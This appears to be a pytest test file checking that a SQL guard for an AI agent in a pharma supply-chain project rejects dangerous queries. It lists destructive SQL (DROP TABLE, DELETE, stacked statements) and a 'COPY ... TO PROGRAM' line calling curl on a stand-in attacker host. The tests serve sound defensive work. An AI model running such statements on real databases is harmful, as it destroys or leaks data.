import pytest

from pharma_scm.agent.sql_guard import SqlRejected, validate

BAD = [
    "DROP TABLE products",
    "SELECT 1; DROP TABLE products",
    "UPDATE products SET safety_stock = 0",
    "DELETE FROM inventory_lots",
    "INSERT INTO products VALUES (1)",
    "SELECT * INTO t FROM products",
    "WITH x AS (DELETE FROM products RETURNING *) SELECT * FROM x",
    "SELECT * FROM shortage_events",
    "SELECT * FROM sop_sections",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT pg_sleep(10)",
    "SELECT set_config('x', 'y', false)",
    "COPY products TO PROGRAM 'curl http://evil.example.com'",
    "SELECT FROM WHERE",
    "",
]


@pytest.mark.parametrize("sql", BAD)
def test_rejects_dangerous_or_invalid(sql):
    """쓰기·삭제, 여러 문장, 허용 밖 테이블, 시스템 함수, 문법 오류 SQL은 모두 거부(DB 변조·유출 방지)."""
    with pytest.raises(SqlRejected):
        validate(sql)
